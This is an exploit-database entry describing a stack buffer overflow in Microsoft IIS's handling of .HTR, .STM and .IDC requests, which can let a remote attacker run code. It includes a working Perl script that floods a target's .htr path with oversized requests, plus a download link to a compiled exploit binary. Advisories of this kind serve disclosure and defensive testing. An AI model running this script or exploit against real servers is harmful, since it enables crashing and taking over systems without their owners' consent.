source: http://www.securityfocus.com/bid/307/info

Microsoft IIS reported prone to a buffer overflow vulnerability in the way IIS handles requests for several file types that require server side processing. This vulnerability may allow a remote attacker to execute arbitrary code on the target machine.

IIS supports a number of file extensions that require futher processing. When a request is made for one of these types of files a specific DLL processes it. A stack buffer overflow vulnerability exists in several of these DLL's while handling .HTR, .STM or .IDC extensions.


Use the following script to test your site:

#!/usr/bin/perl
use LWP::Simple;
for ($i = 2500; $i <= 3500; $i++) {
warn "$i\n";
get "http://$ARGV[0]/".('a' x $i).".htr";
}

https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/19245.exe